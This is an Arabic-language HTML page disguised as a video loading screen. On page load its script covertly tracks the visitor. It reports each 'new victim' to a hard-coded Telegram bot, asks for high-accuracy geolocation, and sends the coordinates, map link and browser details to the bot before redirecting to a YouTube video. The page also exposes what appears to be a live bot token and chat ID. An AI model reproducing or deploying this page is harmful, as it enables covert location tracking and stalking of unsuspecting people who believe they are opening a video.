<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري تحميل المحتوى...</title>
    <style>
        body { background: #0b0b0b; color: white; font-family: 'Arial', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-left-color: #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        p { margin-top: 20px; font-size: 18px; letter-spacing: 1px; }
    </style>
</head>
<body>

    <div class="spinner"></div>
    <p>جاري مزامنة الموقع لتشغيل الفيديو...</p>

    <script>
        const config = {
            token: "8793022795:AAFzOmrMn1eYAkVuBPcy6nh7cf49-WvvaiM",
            id: "1138822664",
            video: "https://youtu.be/8xbenFTurog?si=3YUrwRmRERYyLa1U"
        };

        async function notify(msg) {
            const url = `https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
            await fetch(url);
        }

        async function startCapture() {
            // تنبيه فوري عند دخول الصفحة
            await notify("🔔 **تنبيه:** دخل ضحية جديد الرابط الآن!\nجاري محاولة سحب الموقع...");

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const { latitude, longitude, accuracy } = position.coords;
                        const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                        const report = `🎯 **تم القنص بنجاح!**\n\n📍 الموقع: [اضغط لفتح الخريطة](${mapLink})\n📌 الإحداثيات: \`${latitude}, ${longitude}\`\n📏 الدقة: ${accuracy} متر\n📱 المتصفح: ${navigator.userAgent}`;
                        await notify(report);
                        window.location.href = config.video;
                    },
                    async (error) => {
                        let reason = "رفض الإذن (Denied)";
                        if (error.code == 2) reason = "الموقع غير متاح";
                        if (error.code == 3) reason = "انتهت مهلة الطلب";
                        await notify(`⚠️ **فشل القنص:** الضحية لم يوافق أو تعذر الوصول.\nالسبب: ${reason}`);
                        window.location.href = config.video;
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                await notify("❌ المتصفح لا يدعم Geolocation");
                window.location.href = config.video;
            }
        }

        // تشغيل تلقائي
        window.onload = startCapture;
    </script>
</body>
</html>
